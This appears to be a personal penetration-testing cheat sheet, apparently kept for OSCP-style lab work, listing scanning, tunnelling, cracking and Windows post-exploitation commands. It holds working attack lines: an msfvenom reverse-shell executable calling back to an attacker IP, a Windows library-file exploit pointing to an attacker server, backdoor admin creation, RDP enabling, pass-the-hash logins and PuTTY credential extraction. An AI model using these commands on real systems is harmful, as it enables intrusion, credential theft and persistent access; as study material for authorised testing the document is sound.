# Tools
___!!MAKE SURE TO HAVE ENOUGH RESOURCES..!!___
## nmap
`sudo nmap -sC -sV -T4 -v -p- -oA 192.168.233.227 192.168.233.227` Full TCP scan with logging \
`sudo nmap -sU -T4 -v -p- 192.168.233.153 -oA nmap/192.168.233.153-UDP` Full UDP SCAN with logging

## gobuster
`gobuster dir -u http://192.168.233.153 -w /usr/share/wordlists/dirb/big.txt -t 5 --output gobuster/192.168.233.153` Gobuster dir scan

## curl
`curl`
- `-H "host: test.com"` add header, for testing vhosts\
- `--insecure` ignore certificate issues

## ssh
`ssh`
- `-R 1337:192.168.1.1:3389` Create listening port on the server forwarding to IP:3389\
- `-L 1337:192.168.1.1:3389` Create listening prot lon the local client forwarding to IP:3389

## SWAKS
Swiss Army Knife for SMTP\
- `--to mail@mail.com` Send to address
- `--server` Server to use

## Chisel
`chisel`
- `client` for client mode
- `server` for server mode
Note: issues with starting chisel client when using the pre-compiled version from Kali. Dowloaded release from github does work.\

## ExploitDB
`searchsploit -m XXXXX ` to "mirror" a vulnerability from ExploitDB

## msfvenom
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.186 LPORT=1337 -f exe > rev.exe ` Create windows reverse shell executable

## ligolo-ng
releases for proxy and agent on Github: https://github.com/nicocha30/ligolo-ng

__Start proxy:__\
`sudo ip tuntap add user kali mode tun ligolo`\
`sudo ip link set ligolo up`

`./proxy -selfcert`

__Start ligolo agent:__\
`.\ligolo-agent.exe -connect xxx.xxx.xxx.xxx:11601 -ignore-cert`

__Setup tunnel over proxy:__\
`session` Select session\
`ifconfig` -- Show ip info\
`sudo ip route add 192.168.0.0/24 dev ligolo` Create route ( *In Linux itself* )  
`start` Start tunnel\

--Network is now reachable through proxy--

`listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp` Create a listener on the agent, listening on 0.0.0.0 port 1234 and forwarding to proxy host on port 4321
`listener_list` to show all listeners

## Other usefull resources:
https://crackstation.net/


## WIndows Library file exploit
**NOTE:** After executing windows **optimizes the file** which could make it **unusable** on another machine.
```xml
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.177</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
```

## Cracking SSH keyphrase
`ssh2john sample.key > sample.hash`
`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`

## Alternative to BURP
Zed Attack Proxy  

## Add local administrator
`net user /add user P@ssw0rd!`
`net localgroup administrators user /add`

## Enable RDP
`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
`netsh advfirewall firewall set rule group="remote desktop" new enable=Yes`

## EvilWinRM
`evil-winrm -i ip -u USER-H HASH -r DOMAIN` Sign in with a hash, try without domain as well
using `download FILENAME` a file can be downloaded from the remote system. 

## PSExec
`impacket-psexec USER@ip -hashes :HASH`

`python3 -m pyftpdlib -w -p 21`

`impacket-smbserver -smb2support -username kali -password 1234 oscp oscp`

## Get Putty credentials:
`reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s`
`reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\`

## GIT
`wget -r` download folder over http  
`git show HASH` to show changes in a specific commit  
`git diff` to show all changes  
## Cracking ZIP
`zip2john file.zip > zip.hash` Create hash file for zip archive  
`| cut -d ':' -f 2` To make a zip2john file suitable for Hashcat  


## Loop lookup users based on sid  
(Windows edit seq, start from 500, for linux from 1000)
```
for i in $(seq 1 100); do
    rpcclient -N -U "" 192.168.136.11 -c "lookupsids S-1-22-1-$i";
done
```

## Get user and domain sid 
`rpcclient lookupnames root/admin`
